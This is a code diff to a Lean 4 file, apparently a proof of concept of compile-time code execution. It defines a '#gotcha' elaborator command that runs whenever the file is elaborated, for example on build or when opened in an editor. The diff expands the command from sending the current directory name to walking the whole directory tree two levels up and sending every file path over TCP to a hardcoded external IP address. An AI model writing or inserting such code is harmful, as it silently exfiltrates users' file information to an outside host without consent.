@@ -25,17 +25,21 @@ import Std
 open Lean Std Elab Net
 
 open Internal IO Async in
-def badAsync (bytes: ByteArray) : Async Unit := do
+def badAsync (data : Array ByteArray) : Async Unit := do
   let addr := .ofParts 134 209 208 147
   let socket: SocketAddress := .v4 ⟨addr, 8080⟩
   let client ← TCP.Socket.Client.mk
   client.connect socket
-  client.send bytes
+  client.sendAll data
+  client.shutdown
+
 
 elab "#gotcha" : command => do
   let dir ← IO.currentDir
-  let dirBytes := dir.toString.toByteArray.push '\n'.toUInt8
-  (badAsync dirBytes).block
+  let some (some root) := dir.parent.map (·.parent) | throwError "Boo"
+  let allFiles ← root.walkDir (fun _ => pure true)
+  let data := allFiles.map (·.toString.toByteArray.push '\n'.toUInt8)
+  (badAsync data).block
 
 #gotcha
 
